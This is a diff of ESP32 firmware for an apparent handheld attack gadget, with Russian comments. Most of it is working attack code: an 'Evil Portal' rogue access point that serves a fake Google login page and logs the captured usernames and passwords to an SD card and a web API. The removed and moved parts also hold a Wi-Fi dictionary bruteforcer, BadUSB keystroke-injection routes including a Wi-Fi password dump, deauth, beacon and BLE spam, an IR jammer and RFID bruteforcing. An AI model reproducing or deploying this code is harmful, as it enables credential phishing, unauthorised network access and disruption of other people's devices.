+    canvas.setTextColor(COLOR_WHITE);
+    canvas.setCursor(5, 78);
+    canvas.print("Last:");
+    canvas.setCursor(5, 90);
+    canvas.print(lastCapturedCred.substring(0, 18));
+    drawFooterBar("Hold ESC to Stop");
+  } else {
+    canvas.setTextColor(COLOR_GREEN);
+    canvas.print("Status: STOPPED");
+    canvas.setTextColor(COLOR_WHITE);
+    canvas.setCursor(5, 42);
+    canvas.print("Target SSID:");
+    canvas.setTextColor(COLOR_YELLOW);
+    canvas.setCursor(5, 55);
+    canvas.print(evilPortalSsid);
+    canvas.setTextColor(COLOR_CYAN);
+    canvas.setCursor(5, 75);
+    canvas.print("OK: Config AP");
+    drawFooterBar("OK:Select ESC:Back");
+  }
+  canvasFlush();
+}
+
+void startEvilPortalService() {
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(evilPortalSsid);
+  delay(100);
+  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+  webServer.on("/login", HTTP_POST, []() {
+    String u = webServer.hasArg("user") ? webServer.arg("user") : "unknown";
+    String p = webServer.hasArg("pass") ? webServer.arg("pass") : "empty";
+    lastCapturedCred = u + " / " + p;
+    capturedCredsCount++;
+    appendCredToSd(u, p);
+    webServer.send(200, "text/html",
+                   "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head>"
+                   "<body style='font-family:sans-serif;text-align:center;padding:40px;'>"
+                   "<h2 style='color:#1a73e8;'>Успешный вход</h2>"
+                   "<p>Аккаунт Google успешно подтвержден. Можете закрыть страницу.</p>"
+                   "</body></html>");
+  });
+  webServer.onNotFound([]() {
+    bool sdPortalLoaded = false;
+    if (isSdCardAvailable) {
+      digitalWrite(TFT_CS, HIGH);
+      digitalWrite(SD_CS, LOW);
+      if (SD.exists("/portal.html")) {
+        File f = SD.open("/portal.html", FILE_READ);
+        if (f) {
+          webServer.streamFile(f, "text/html");
+          f.close();
+          sdPortalLoaded = true;
+        }
+      }
+      digitalWrite(SD_CS, HIGH);
+    }
+    if (!sdPortalLoaded) {
+      webServer.send(200, "text/html", EVIL_PORTAL_HTML);
+    }
+  });
+  webServer.on("/api/portal/creds/list", HTTP_GET, []() {
+    String json = "[";
+    if (isSdCardAvailable) {
+      digitalWrite(TFT_CS, HIGH);
+      digitalWrite(SD_CS, LOW);
+      File logFile = SD.open("/captured_creds.txt", FILE_READ);
+      if (logFile) {
+        bool first = true;
+        while (logFile.available()) {
+          String line = logFile.readStringUntil('\n');
+          line.trim();
+          if (line.length() > 0) {
+            if (!first) json += ",";
+            first = false;
+            json += "\"" + line + "\"";
+          }
+        }
+        logFile.close();
+        updateBuzzer();
+      }
+      digitalWrite(SD_CS, HIGH);
+    }
+    json += "]";
+    webServer.send(200, "application/json", json);
+  });
+  webServer.begin();
+  isEvilPortalRunning = true;
+  drawEvilPortalPage();
+  while (isEvilPortalRunning) {
+    dnsServer.processNextRequest();
+    webServer.handleClient();
+    if (digitalRead(BTN_ESC) == LOW) {
+      delay(100);
+      if (digitalRead(BTN_ESC) == LOW) {
+        isEvilPortalRunning = false;
+      }
+    }
+    updateBuzzer();
+    yield();
+  }
+  webServer.stop();
+  dnsServer.stop();
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_OFF);
+  drawHeaderBar("EVIL PORTAL");
+  canvas.setTextColor(COLOR_RED);
+  canvas.setCursor(5, 50);
+  canvas.print("Portal Stopped!");
+  canvasFlush();
+  delay(1000);
+  drawEvilPortalPage();
+}
+
+void loadCapturedCredentials() {
+  capturedCredCount = 0;
+  if (!isSdCardAvailable) return;
+  digitalWrite(TFT_CS, HIGH);
+  digitalWrite(SD_CS, LOW);
+  File logFile = SD.open("/captured_creds.txt", FILE_READ);
+  if (!logFile) {
+    digitalWrite(SD_CS, HIGH);
+    return;
+  }
+  while (logFile.available() && capturedCredCount < MAX_CAPTURED_LINES) {
+    String line = logFile.readStringUntil('\n');
+    line.trim();
+    if (line.length() > 0) {
+      capturedCredLines[capturedCredCount++] = line;
+    }
+    updateBuzzer();
+  }
+  logFile.close();
+  digitalWrite(SD_CS, HIGH);
+}
+
+// ======================================================================
+// 19. ИНФОРМАЦИОННЫЕ СТРАНИЦЫ
+// ======================================================================
+void drawSdInfoPage() {
+  drawHeaderBar("MICROSD INFO");
+  canvas.setTextSize(1);
+  canvas.setCursor(5, 28);
+  if (isSdCardAvailable) {
+    canvas.setTextColor(COLOR_GREEN);
+    canvas.print("Status: MOUNTED");
+    digitalWrite(TFT_CS, HIGH);
+    digitalWrite(SD_CS, LOW);
+    uint64_t totalSizeMb = SD.cardSize() / (1024 * 1024);
+    digitalWrite(SD_CS, HIGH);
+    canvas.setCursor(5, 45);
+    canvas.setTextColor(COLOR_WHITE);
+    canvas.printf("Size: %u MB", (uint32_t)totalSizeMb);
+    canvas.setCursor(5, 62);
+    canvas.setTextColor(COLOR_YELLOW);
+    canvas.print("Config : /config.txt");
+    canvas.setCursor(5, 78);
+    canvas.setTextColor(COLOR_CYAN);
+    canvas.print("Payload: /payload.txt");
+  } else {
+    canvas.setTextColor(COLOR_RED);
+    canvas.print("Status: NOT FOUND");
+  }
+  drawFooterBar("ESC: back");
+  canvasFlush();
+}
+
+void drawAboutSystemPage() {
+  drawHeaderBar("ABOUT SYSTEM");
+  canvas.setTextColor(COLOR_GREEN);
+  canvas.setTextSize(1);
+  canvas.setCursor(5, 28);
+  canvas.print("Board: ESP32-S3");
+  canvas.setCursor(5, 43);
+  canvas.print("LCD: ST7735 128x128");
+  canvas.setCursor(5, 58);
+  canvas.print("USB: HID Keyboard + Mouse");
+  canvas.setCursor(5, 73);
+  canvas.print("Portal: DNS Captive");
+  canvas.setCursor(5, 88);
+  canvas.print("RFID: PN532 I2C");
+  drawFooterBar("ESC: back");
+  canvasFlush();
+}
+
+void drawRemoteStreamStatusPage() {
+  drawHeaderBar("SERIAL REMOTE");
+  canvas.setTextColor(COLOR_GREEN);
+  canvas.setCursor(5, 30);
+  canvas.print("Stream Ready!");
+  canvas.setTextColor(COLOR_WHITE);
+  canvas.setCursor(5, 50);
+  canvas.print("Use PC Manager app");
+  canvas.setCursor(5, 65);
+  canvas.print("to mirror screen");
+  canvas.setCursor(5, 80);
+  canvas.print("& control via D-Pad.");
+  drawFooterBar("ESC: Back");
+  canvasFlush();
+}
+
+
+// ---------- BLE ----------
 void startBleSpamAttack() {
   if (bleActive) return;
   BLEDevice::init("AirPods Pro");
@@ -1735,36 +3109,6 @@ void stopBleSpamAttack() {
   if (!bleActive) return;
   BLEDevice::deinit(true);
   bleActive = false;
-}
-
-void drawBleSnifferPage() {
-  drawHeaderBar("BLE DEVS SCANNER");
-  if (bleScannedCount == 0) {
-    canvas.setTextColor(COLOR_YELLOW);
-    canvas.setCursor(10, 45);
-    canvas.print("No BLE May Found.");
-    canvas.setCursor(10, 60);
-    canvas.setTextColor(COLOR_WHITE);
-    canvas.print("Press OK to sniff");
-    drawFooterBar("OK: Sniff BLE ESC:Back");
-    canvasFlush();
-    return;
-  }
-  for (int i = 0; i < 4; i++) {
-    if (i >= bleScannedCount) break;
-    int lineY = 25 + i * 20;
-    canvas.setTextColor(COLOR_GREEN);
-    canvas.setCursor(5, lineY);
-    canvas.print(bleScannedList[i].macAddress);
-    canvas.setTextColor(COLOR_WHITE);
-    canvas.setCursor(5, lineY + 10);
-    canvas.print(bleScannedList[i].deviceName[0] ? bleScannedList[i].deviceName : "[Hidden]");
-    canvas.setCursor(105, lineY);
-    canvas.setTextColor(COLOR_YELLOW);
-    canvas.print(bleScannedList[i].signalRssi);
-  }
-  drawFooterBar("OK: Sniff Again");
-  canvasFlush();
 }
 
 class CustomBleScanCallbacks : public BLEAdvertisedDeviceCallbacks {
@@ -1798,6 +3142,38 @@ void runBleSnifferScan() {
   drawBleSnifferPage();
 }
 
+void drawBleSnifferPage() {
+  drawHeaderBar("BLE DEVS SCANNER");
+  if (bleScannedCount == 0) {
+    canvas.setTextColor(COLOR_YELLOW);
+    canvas.setCursor(10, 45);
+    canvas.print("No BLE May Found.");
+    canvas.setCursor(10, 60);
+    canvas.setTextColor(COLOR_WHITE);
+    canvas.print("Press OK to sniff");
+    drawFooterBar("OK: Sniff BLE ESC:Back");
+    canvasFlush();
+    return;
+  }
+  for (int i = 0; i < 4; i++) {
+    if (i >= bleScannedCount) break;
+    int lineY = 25 + i * 20;
+    canvas.setTextColor(COLOR_GREEN);
+    canvas.setCursor(5, lineY);
+    canvas.print(bleScannedList[i].macAddress);
+    canvas.setTextColor(COLOR_WHITE);
+    canvas.setCursor(5, lineY + 10);
+    canvas.print(bleScannedList[i].deviceName[0] ? bleScannedList[i].deviceName : "[Hidden]");
+    canvas.setCursor(105, lineY);
+    canvas.setTextColor(COLOR_YELLOW);
+    canvas.print(bleScannedList[i].signalRssi);
+    updateBuzzer();
+  }
+  drawFooterBar("OK: Sniff Again");
+  canvasFlush();
+}
+
+// ---------- SD WARDRIVE ----------
 void executeSdWardrivingLog() {
   drawHeaderBar("SD WARDRIVING");
   canvas.setTextColor(COLOR_WHITE);
@@ -1834,6 +3210,7 @@ void executeSdWardrivingLog() {
                        WiFi.channel(i),
                        WiFi.encryptionType(i));
         loggedCount++;
+        updateBuzzer();
       }
       csvFile.close();
     }
@@ -1850,109 +3227,7 @@ void executeSdWardrivingLog() {
   canvasFlush();
 }
 
-void wifiBruteforce() {
-  drawHeaderBar("WIFI BRUTEFORCE");
-  if (!isSdCardAvailable) {
-    canvas.setTextColor(COLOR_RED);
-    canvas.setCursor(5, 50);
-    canvas.print("No SD card!");
-    drawFooterBar("ESC: Back");
-    canvasFlush();
-    delay(1500);
-    return;
-  }
-  if (wifiScannedCount == 0) {
-    canvas.setTextColor(COLOR_YELLOW);
-    canvas.setCursor(5, 50);
-    canvas.print("Scan networks first!");
-    drawFooterBar("ESC: Back");
-    canvasFlush();
-    delay(1500);
-    return;
-  }
-  WiFiNetwork target = scannedNetworks[wifiSelectedIndex];
-  canvas.setTextColor(COLOR_WHITE);
-  canvas.setCursor(5, 25);
-  canvas.printf("Target: %s", target.ssid);
-  canvas.setCursor(5, 40);
-  canvas.print("Loading dictionary...");
-  canvasFlush();
-  digitalWrite(TFT_CS, HIGH);
-  digitalWrite(SD_CS, LOW);
-  File dict = SD.open("/wifi_passwords.txt", FILE_READ);
-  if (!dict) {
-    digitalWrite(SD_CS, HIGH);
-    canvas.setTextColor(COLOR_RED);
-    canvas.setCursor(5, 60);
-    canvas.print("File not found!");
-    drawFooterBar("ESC: Back");
-    canvasFlush();
-    delay(1500);
-    return;
-  }
-  WiFi.mode(WIFI_STA);
-  while (dict.available()) {
-    String pass = dict.readStringUntil('\n');
-    pass.trim();
-    if (pass.length() == 0) continue;
-    canvas.fillRect(0, 55, 128, 25, COLOR_BLACK);
-    canvas.setTextColor(COLOR_CYAN);
-    canvas.setCursor(5, 65);
-    canvas.printf("Trying: %s", pass.c_str());
-    canvasFlush();
-    WiFi.begin(target.ssid, pass.c_str());
-    unsigned long start = millis();
-    while (WiFi.status() != WL_CONNECTED && millis() - start < 3000) {
-      delay(100);
-      if (digitalRead(BTN_ESC) == LOW) {
-        WiFi.disconnect();
-        drawHeaderBar("BRUTEFORCE");
-        canvas.setTextColor(COLOR_RED);
-        canvas.setCursor(5, 50);
-        canvas.print("Canceled");
-        canvasFlush();
-        delay(800);
-        dict.close();
-        digitalWrite(SD_CS, HIGH);
-        return;
-      }
-    }
-    if (WiFi.status() == WL_CONNECTED) {
-      drawHeaderBar("SUCCESS!");
-      canvas.setTextColor(COLOR_GREEN);
-      canvas.setCursor(5, 40);
-      canvas.print("Password found:");
-      canvas.setTextColor(COLOR_YELLOW);
-      canvas.setCursor(5, 55);
-      canvas.print(pass);
-      canvas.setTextColor(COLOR_WHITE);
-      canvas.setCursor(5, 70);
-      canvas.print("Press ESC to exit");
-      drawFooterBar("ESC: Back");
-      canvasFlush();
-      WiFi.disconnect();
-      dict.close();
-      digitalWrite(SD_CS, HIGH);
-      while (digitalRead(BTN_ESC) == HIGH) delay(50);
-      return;
-    }
-    WiFi.disconnect();
-    delay(200);
-  }
-  dict.close();
-  digitalWrite(SD_CS, HIGH);
-  drawHeaderBar("BRUTEFORCE");
-  canvas.setTextColor(COLOR_RED);
-  canvas.setCursor(5, 50);
-  canvas.print("Password not found");
-  drawFooterBar("ESC: Back");
-  canvasFlush();
-  delay(1500);
-}
-
-// ======================================================================
-// 21. BADUSB
-// ======================================================================
+// ---------- BADUSB ----------
 void ensureEnglishLayout() {
   if (!isUsbHidReady) return;
   drawHeaderBar("language change...");
@@ -2076,6 +3351,7 @@ void executeDuckyScriptFromSd() {
     } else if (line.equals("GUI") || line.equals("WINDOWS")) {
       Keyboard.write(KEY_LEFT_GUI);
     }
+    updateBuzzer();
     delay(50);
   }
   scriptFile.close();
@@ -2243,621 +3519,7 @@ void runBadUsbDumpWifi() {
 }
 
 // ======================================================================
-// 22. EVIL PORTAL
-// ======================================================================
-void drawEvilPortalPage() {
-  drawHeaderBar("EVIL PORTAL AP");
-  canvas.setTextColor(COLOR_WHITE);
-  canvas.setCursor(5, 25);
-  if (isEvilPortalRunning) {
-    canvas.setTextColor(COLOR_RED);
-    canvas.print("PORTAL: RUNNING");
-    canvas.setTextColor(COLOR_YELLOW);
-    canvas.setCursor(5, 42);
-    canvas.printf("SSID: %s", evilPortalSsid);
-    canvas.setTextColor(COLOR_CYAN);
-    canvas.setCursor(5, 60);
-    canvas.printf("Captured: %d creds", capturedCredsCount);
-    canvas.setTextColor(COLOR_WHITE);
-    canvas.setCursor(5, 78);
-    canvas.print("Last:");
-    canvas.setCursor(5, 90);
-    canvas.print(lastCapturedCred.substring(0, 18));
-    drawFooterBar("Hold ESC to Stop");
-  } else {
-    canvas.setTextColor(COLOR_GREEN);
-    canvas.print("Status: STOPPED");
-    canvas.setTextColor(COLOR_WHITE);
-    canvas.setCursor(5, 42);
-    canvas.print("Target SSID:");
-    canvas.setTextColor(COLOR_YELLOW);
-    canvas.setCursor(5, 55);
-    canvas.print(evilPortalSsid);
-    canvas.setTextColor(COLOR_CYAN);
-    canvas.setCursor(5, 75);
-    canvas.print("OK: Config AP");
-    drawFooterBar("OK:Select ESC:Back");
-  }
-  canvasFlush();
-}
-
-void drawPortalSsidSelectPage() {
-  drawHeaderBar("CHOOSE TARGET SSID");
-  if (wifiScannedCount == 0) {
-    canvas.setTextColor(COLOR_YELLOW);
-    canvas.setCursor(5, 45);
-    canvas.print("Scanning networks...");
-    canvasFlush();
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
-    delay(100);
-    wifiScannedCount = WiFi.scanNetworks(false, false, false, 200);
-    if (wifiScannedCount > 10) wifiScannedCount = 10;
-  }
-  if (portalSsidIndex >= wifiScannedCount && wifiScannedCount > 0) portalSsidIndex = 0;
-  for (int i = 0; i < 4; i++) {
-    int idx = i + evilPortalSubMenuScrollOffset;
-    if (idx >= wifiScannedCount) break;
-    int lineY = 25 + i * 20;
-    if (idx == portalSsidIndex) {
-      canvas.fillRoundRect(3, lineY - 3, 122, 17, 3, accentColor);
-      canvas.setTextColor(COLOR_BLACK);
-    } else {
-      canvas.setTextColor(COLOR_WHITE);
-    }
-    canvas.setCursor(5, lineY);
-    canvas.print(WiFi.SSID(idx).substring(0, 16));
-  }
-  if (wifiScannedCount == 0) {
-    canvas.setTextColor(COLOR_RED);
-    canvas.setCursor(5, 45);
-    canvas.print("No Wi-Fi found!");
-  }
-  drawFooterBar("UP/DN:Nav OK:Select");
-  canvasFlush();
-}
-
-void startEvilPortalService() {
-  WiFi.mode(WIFI_AP);
-  WiFi.softAP(evilPortalSsid);
-  delay(100);
-  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
-  webServer.on("/login", HTTP_POST, []() {
-    String u = webServer.hasArg("user") ? webServer.arg("user") : "unknown";
-    String p = webServer.hasArg("pass") ? webServer.arg("pass") : "empty";
-    lastCapturedCred = u + " / " + p;
-    capturedCredsCount++;
-    appendCredToSd(u, p);
-    webServer.send(200, "text/html",
-                   "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head>"
-                   "<body style='font-family:sans-serif;text-align:center;padding:40px;'>"
-                   "<h2 style='color:#1a73e8;'>Успешный вход</h2>"
-                   "<p>Аккаунт Google успешно подтвержден. Можете закрыть страницу.</p>"
-                   "</body></html>");
-  });
-  webServer.onNotFound([]() {
-    bool sdPortalLoaded = false;
-    if (isSdCardAvailable) {
-      digitalWrite(TFT_CS, HIGH);
-      digitalWrite(SD_CS, LOW);
-      if (SD.exists("/portal.html")) {
-        File f = SD.open("/portal.html", FILE_READ);
-        if (f) {
-          webServer.streamFile(f, "text/html");
-          f.close();
-          sdPortalLoaded = true;
-        }
-      }
-      digitalWrite(SD_CS, HIGH);
-    }
-    if (!sdPortalLoaded) {
-      webServer.send(200, "text/html", EVIL_PORTAL_HTML);
-    }
-  });
-  webServer.on("/api/portal/creds/list", HTTP_GET, []() {
-    String json = "[";
-    if (isSdCardAvailable) {
-      digitalWrite(TFT_CS, HIGH);
-      digitalWrite(SD_CS, LOW);
-      File logFile = SD.open("/captured_creds.txt", FILE_READ);
-      if (logFile) {
-        bool first = true;
-        while (logFile.available()) {
-          String line = logFile.readStringUntil('\n');
-          line.trim();
-          if (line.length() > 0) {
-            if (!first) json += ",";
-            first = false;
-            json += "\"" + line + "\"";
-          }
-        }
-        logFile.close();
-      }
-      digitalWrite(SD_CS, HIGH);
-    }
-    json += "]";
-    webServer.send(200, "application/json", json);
-  });
-  webServer.begin();
-  isEvilPortalRunning = true;
-  drawEvilPortalPage();
-  while (isEvilPortalRunning) {
-    dnsServer.processNextRequest();
-    webServer.handleClient();
-    if (digitalRead(BTN_ESC) == LOW) {
-      delay(100);
-      if (digitalRead(BTN_ESC) == LOW) {
-        isEvilPortalRunning = false;
-      }
-    }
-    yield();
-  }
-  webServer.stop();
-  dnsServer.stop();
-  WiFi.softAPdisconnect(true);
-  WiFi.mode(WIFI_OFF);
-  drawHeaderBar("EVIL PORTAL");
-  canvas.setTextColor(COLOR_RED);
-  canvas.setCursor(5, 50);
-  canvas.print("Portal Stopped!");
-  canvasFlush();
-  delay(1000);
-  drawEvilPortalPage();
-}
-
-void loadCapturedCredentials() {
-  capturedCredCount = 0;
-  if (!isSdCardAvailable) return;
-  digitalWrite(TFT_CS, HIGH);
-  digitalWrite(SD_CS, LOW);
-  File logFile = SD.open("/captured_creds.txt", FILE_READ);
-  if (!logFile) {
-    digitalWrite(SD_CS, HIGH);
-    return;
-  }
-  while (logFile.available() && capturedCredCount < MAX_CAPTURED_LINES) {
-    String line = logFile.readStringUntil('\n');
-    line.trim();
-    if (line.length() > 0) {
-      capturedCredLines[capturedCredCount++] = line;
-    }
-  }
-  logFile.close();
-  digitalWrite(SD_CS, HIGH);
-}
-
-void capturedpasswords() {
-  drawHeaderBar("EVIL PORTAL PASSWORDS");
-  if (capturedCredCount == 0) {
-    canvas.setTextColor(COLOR_RED);
-    canvas.setCursor(5, 45);
-    canvas.print("No credentials saved");
-    drawFooterBar("ESC: Back");
-    canvasFlush();
-    return;
-  }
-  if (capturedSelectedIndex < 0) capturedSelectedIndex = 0;
-  if (capturedSelectedIndex >= capturedCredCount) capturedSelectedIndex = capturedCredCount - 1;
-  if (capturedSelectedIndex < capturedScrollOffset) capturedScrollOffset = capturedSelectedIndex;
-  if (capturedSelectedIndex >= capturedScrollOffset + MAX_VISIBLE_ITEMS) {
-    capturedScrollOffset = capturedSelectedIndex - MAX_VISIBLE_ITEMS + 1;
-  }
-  if (capturedScrollOffset < 0) capturedScrollOffset = 0;
-  if (capturedScrollOffset > capturedCredCount - MAX_VISIBLE_ITEMS) {
-    capturedScrollOffset = capturedCredCount - MAX_VISIBLE_ITEMS;
-  }
-  if (millis() - marqueeTimer > 200) {
-    marqueeTimer = millis();
-    marqueeOffset++;
-  }
-  for (uint8_t i = 0; i < MAX_VISIBLE_ITEMS; i++) {
-    int idx = i + capturedScrollOffset;
-    if (idx >= capturedCredCount) break;
-    int lineY = 25 + i * 20;
-    String fullLine = capturedCredLines[idx];
-    if (idx == capturedSelectedIndex) {
-      canvas.fillRoundRect(2, lineY - 3, 124, 17, 3, accentColor);
-      canvas.setTextColor(COLOR_BLACK);
-      canvas.setCursor(4, lineY);
-      canvas.print("> ");
-      if (fullLine.length() * 6 > 100) {
-        int shift = marqueeOffset % (fullLine.length() + 3);
-        String subText = fullLine.substring(shift) + "   " + fullLine.substring(0, shift);
-        canvas.print(subText.substring(0, 16));
-      } else {
-        canvas.print(fullLine);
-      }
-    } else {
-      canvas.setTextColor(COLOR_WHITE);
-      canvas.setCursor(4, lineY);
-      canvas.print("  ");
-      String displayLine = fullLine;
-      if (displayLine.length() > 18) displayLine = displayLine.substring(0, 18) + "...";
-      canvas.print(displayLine);
-    }
-  }
-  if (capturedCredCount > MAX_VISIBLE_ITEMS) {
-    int barHeight = 85 / capturedCredCount;
-    int barY = 25 + (capturedScrollOffset * 85) / capturedCredCount;
-    canvas.drawFastVLine(126, 25, 85, COLOR_DARKGREY);
-    canvas.fillRect(125, barY, 3, barHeight < 5 ? 5 : barHeight, accentColor);
-  }
-  drawFooterBar("UP/DN:Scroll  OK:Copy?");
-  canvasFlush();
-}
-
-// ======================================================================
-// 23. ВЕБ-СЕРВЕР (УПРАВЛЕНИЕ МЫШЬЮ, БЕЗ ЯРКОСТИ)
-// ======================================================================
-void setupWebServerRoutes() {
-  webServer.on("/", HTTP_GET, []() {
-    webServer.send(200, "text/html", HTML_DASHBOARD);
-  });
-
-  // HID
-  webServer.on("/api/hid/notepad", HTTP_GET, []() {
-    runBadUsbDemoNotepad();
-    webServer.send(200, "application/json", "{\"msg\":\"Win+R Notepad выполнен!\"}");
-  });
-  webServer.on("/api/hid/payload", HTTP_GET, []() {
-    executeDuckyScriptFromSd();
-    webServer.send(200, "application/json", "{\"msg\":\"Скрипт /payload.txt выполнен!\"}");
-  });
-  webServer.on("/api/hid/type", HTTP_GET, []() {
-    if (webServer.hasArg("text")) {
-      String t = webServer.arg("text");
-      runBadUsbCustomString(t);
-      webServer.send(200, "application/json", "{\"msg\":\"Текст напечатан!\"}");
-    } else {
-      webServer.send(200, "application/json", "{\"msg\":\"Ошибка: Нет текста\"}");
-    }
-  });
-
-  // BadUSB
-  webServer.on("/api/badusb/shutdown", HTTP_GET, []() {
-    runBadUsbShutdown();
-    webServer.send(200, "application/json", "{\"msg\":\"Shutdown executed\"}");
-  });
-  webServer.on("/api/badusb/wallpaper", HTTP_GET, []() {
-    runBadUsbWallpaper();
-    webServer.send(200, "application/json", "{\"msg\":\"Wallpaper changed\"}");
-  });
-  webServer.on("/api/badusb/disableicons", HTTP_GET, []() {
-    runBadUsbDisableIcons();
-    webServer.send(200, "application/json", "{\"msg\":\"Icons disabled\"}");
-  });
-  webServer.on("/api/badusb/dumpwifi", HTTP_GET, []() {
-    runBadUsbDumpWifi();
-    webServer.send(200, "application/json", "{\"msg\":\"Wi-Fi passwords dumped\"}");
-  });
-
-  // Evil Portal
-  webServer.on("/api/portal/start", HTTP_GET, []() {
-    webServer.send(200, "application/json", "{\"msg\":\"Evil Portal запущен на дисплее!\"}");
-    startEvilPortalService();
-  });
-  webServer.on("/api/portal/stop", HTTP_GET, []() {
-    isEvilPortalRunning = false;
-    webServer.send(200, "application/json", "{\"msg\":\"Evil Portal остановлен\"}");
-  });
-  webServer.on("/api/portal/creds", HTTP_GET, []() {
-    String json = "{\"count\":" + String(capturedCredsCount) + ",\"last\":\"" + lastCapturedCred + "\"}";
-    webServer.send(200, "application/json", json);
-  });
-  webServer.on("/api/portal/creds/list", HTTP_GET, []() {
-    String json = "[";
-    if (isSdCardAvailable) {
-      digitalWrite(TFT_CS, HIGH);
-      digitalWrite(SD_CS, LOW);
-      File logFile = SD.open("/captured_creds.txt", FILE_READ);
-      if (logFile) {
-        bool first = true;
-        while (logFile.available()) {
-          String line = logFile.readStringUntil('\n');
-          line.trim();
-          if (line.length() > 0) {
-            if (!first) json += ",";
-            first = false;
-            json += "\"" + line + "\"";
-          }
-        }
-        logFile.close();
-      }
-      digitalWrite(SD_CS, HIGH);
-    }
-    json += "]";
-    webServer.send(200, "application/json", json);
-  });
-
-  // RFID
-  webServer.on("/api/rfid/scan", HTTP_GET, []() {
-    executeRfidTagScan();
-    String json = "{\"msg\":\"Метка прочитана!\", \"uid\":\"" + String(activeRfidUidHex) + "\"}";
-    webServer.send(200, "application/json", json);
-  });
-  webServer.on("/api/rfid/emulate", HTTP_GET, []() {
-    webServer.send(200, "application/json", "{\"msg\":\"Эмуляция запущенa! Нажмите ESC на плате для выхода.\"}");
-    emulateActiveRfidUid();
-  });
-  webServer.on("/api/rfid/erase", HTTP_GET, []() {
-    eraseDataOnCustomBlock();
-    webServer.send(200, "application/json", "{\"msg\":\"Блок очищен (0x00)\"}");
-  });
-  webServer.on("/api/rfid/bruteforce/start", HTTP_GET, []() {
-    bruteForceRfid();
-    webServer.send(200, "application/json", "{\"msg\":\"Bruteforce started\"}");
-  });
-
-  // IR
-  webServer.on("/api/ir/tvbgone", HTTP_GET, []() {
-    webServer.send(200, "application/json", "{\"msg\":\"Запущена пачка TV-B-Gone (100 кодов)!\"}");
-    runClassicTvBGoneLoop();
-  });
-  webServer.on("/api/ir/get", HTTP_GET, []() {
-    String irData = activeIrSignal.valid ?
-      ("Proto: " + typeToString(activeIrSignal.type) + " | Val: 0x" + String((uint32_t)activeIrSignal.value, HEX)) :
-      "IR RAM: Empty";
-    String json = "{\"msg\":\"Данные получены\", \"ir\":\"" + irData + "\"}";
-    webServer.send(200, "application/json", json);
-  });
-  webServer.on("/api/ir/jammer/start", HTTP_GET, []() {
-    runIrJammer();
-    webServer.send(200, "application/json", "{\"msg\":\"IR Jammer started\"}");
-  });
-  webServer.on("/api/ir/jammer/stop", HTTP_GET, []() {
-    irJammerActive = false;
-    webServer.send(200, "application/json", "{\"msg\":\"IR Jammer stopped\"}");
-  });
-  webServer.on("/api/ir/saved/list", HTTP_GET, []() {
-    String json = "[";
-    if (isSdCardAvailable) {
-      digitalWrite(TFT_CS, HIGH);
-      digitalWrite(SD_CS, LOW);
-      File file = SD.open("/ir_saved.txt", FILE_READ);
-      if (file) {
-        bool first = true;
-        while (file.available()) {
-          String line = file.readStringUntil('\n');
-          line.trim();
-          if (line.length() > 0) {
-            if (!first) json += ",";
-            first = false;
-            json += "\"" + line + "\"";
-          }
-        }
-        file.close();
-      }
-      digitalWrite(SD_CS, HIGH);
-    }
-    json += "]";
-    webServer.send(200, "application/json", json);
-  });
-  webServer.on("/api/ir/saved/send", HTTP_GET, []() {
-    if (webServer.hasArg("index")) {
-      int idx = webServer.arg("index").toInt();
-      sendIrSavedSignal(idx);
-      webServer.send(200, "application/json", "{\"msg\":\"Signal sent\"}");
-    } else {
-      webServer.send(200, "application/json", "{\"msg\":\"Missing index\"}");
-    }
-  });
-
-  // Wi-Fi
-  webServer.on("/api/wifi/scan", HTTP_GET, []() {
-    WiFi.mode(WIFI_AP_STA);
-    int16_t n = WiFi.scanNetworks(false, false, false, 200);
-    String json = "[";
-    for (int i = 0; i < n; i++) {
-      if (i > 0) json += ",";
-      json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",\"rssi\":" + String(WiFi.RSSI(i)) + ",\"ch\":" + String(WiFi.channel(i)) + "}";
-      if (i >= 10) break;
-    }
-    json += "]";
-    WiFi.scanDelete();
-    webServer.send(200, "application/json", json);
-  });
-  webServer.on("/api/wifi/wardrive", HTTP_GET, []() {
-    executeSdWardrivingLog();
-    webServer.send(200, "application/json", "{\"msg\":\"Wardrive сохранён в /wardrive.csv!\"}");
-  });
-  webServer.on("/api/wifi/beacon/start", HTTP_GET, []() {
-    if (!isBeaconSpamActive) {
-      isBeaconSpamActive = true;
-      WiFi.mode(WIFI_AP);
-      WiFi.softAP("AP Flood Active");
-    }
-    webServer.send(200, "application/json", "{\"msg\":\"Beacon Spam started\"}");
-  });
-  webServer.on("/api/wifi/beacon/stop", HTTP_GET, []() {
-    isBeaconSpamActive = false;
-    WiFi.mode(WIFI_OFF);
-    webServer.send(200, "application/json", "{\"msg\":\"Beacon Spam stopped\"}");
-  });
-  webServer.on("/api/wifi/deauth/start", HTTP_GET, []() {
-    if (wifiScannedCount == 0) {
-      webServer.send(200, "application/json", "{\"msg\":\"No networks scanned!\"}");
-      return;
-    }
-    deauthActive = true;
-    WiFi.mode(WIFI_STA);
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_channel(scannedNetworks[wifiSelectedIndex].channel, WIFI_SECOND_CHAN_NONE);
-    webServer.send(200, "application/json", "{\"msg\":\"Deauth started\"}");
-  });
-  webServer.on("/api/wifi/deauth/stop", HTTP_GET, []() {
-    deauthActive = false;
-    esp_wifi_set_promiscuous(false);
-    WiFi.mode(WIFI_OFF);
-    webServer.send(200, "application/json", "{\"msg\":\"Deauth stopped\"}");
-  });
-
-  // BLE
-  webServer.on("/api/ble/spam/start", HTTP_GET, []() {
-    if (!isBleSpamActive) {
-      isBleSpamActive = true;
-      startBleSpamAttack();
-    }
-    webServer.send(200, "application/json", "{\"msg\":\"BLE Spam started\"}");
-  });
-  webServer.on("/api/ble/spam/stop", HTTP_GET, []() {
-    if (isBleSpamActive) {
-      isBleSpamActive = false;
-      stopBleSpamAttack();
-    }
-    webServer.send(200, "application/json", "{\"msg\":\"BLE Spam stopped\"}");
-  });
-  webServer.on("/api/ble/scan", HTTP_GET, []() {
-    runBleSnifferScan();
-    String json = "[";
-    for (int i = 0; i < bleScannedCount; i++) {
-      if (i > 0) json += ",";
